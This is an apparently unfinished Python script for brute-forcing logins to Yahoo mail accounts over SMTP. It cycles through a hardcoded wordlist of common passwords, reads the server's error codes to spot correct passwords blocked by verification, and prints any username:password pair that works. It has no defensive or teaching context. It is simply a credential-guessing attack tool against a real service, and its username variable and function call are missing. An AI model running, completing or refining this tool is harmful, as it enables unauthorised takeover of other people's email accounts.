import smtplib, time, sys
 
try:
    server = smtplib.SMTP('smtp.mail.yahoo.com',587)
    server.ehlo()
    server.starttls()
except:
    print('[!] Error Connecting to SMTP Server')
    time.sleep(5)
    sys.exit()
 
passwords = ['password', 'admin', 'adminsitator', 'passwords', 'godlover', 'adminstatorlogin',
             'pass1337', 'location', 'muslim', 'password10', 'mylovelycat', 'justinBieber', 'crackingMe', 'catanddoglover',
             'ilovejesus', 'willgodeverbemyfriend', 'PaSssword', ]
amount = len(passwords)
 
def bruteForce():
    print('[*] Status: Cracking ('+str(amount)+') passwords')
    for password in passwords:
        time.sleep(1)
        try:
            server.login(username, password)
            combination = (username+':'+password)
            print('[*] Combination Found: %s' %combination)
            break
        except smtplib.SMTPAuthenticationError as msg:
            if msg.smtp_code == 534:
                print('[roy shammen] Password correct email verification is enabled (%s)' %password)
            elif msg.smtp_code == 535:
                print('[535] Incorrect password (%s)' %password)
    print('[*] Status: Finished!')
    time.sleep(5)
    sys.exit()
 
